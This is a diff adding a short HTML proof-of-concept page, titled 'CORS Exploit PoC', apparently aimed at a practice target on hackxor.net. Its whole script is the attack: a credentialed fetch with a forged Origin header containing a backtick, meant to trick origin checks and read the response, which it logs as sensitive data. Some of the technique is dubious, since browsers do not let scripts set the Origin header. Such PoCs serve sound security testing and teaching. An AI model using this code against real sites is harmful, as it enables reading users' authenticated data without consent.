@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Misconfiguration Test</title>
+</head>
+<body>
+    <h1>CORS Exploit PoC</h1>
+    <button onclick="exploit()">Run Exploit</button>
+
+    <script>
+        function exploit() {
+            // Target URL
+            const targetUrl = "http://example.com%60.hackxor.net/static/cors.html";
+
+            // Craft the request with the malicious Origin header
+            fetch(targetUrl, {
+                method: 'GET',
+                headers: {
+                    'Origin': 'http://example.com`.hackxor.net'
+                },
+                credentials: 'include'
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.text(); // Get the response content
+                } else {
+                    throw new Error("CORS test failed or no vulnerability found.");
+                }
+            })
+            .then(data => {
+                // Log the response (sensitive information)
+                console.log("Vulnerable response content:", data);
+                alert("Vulnerable! Check the console for response data.");
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("Test failed or no CORS vulnerability found.");
+            });
+        }
+    </script>
+</body>
+</html>
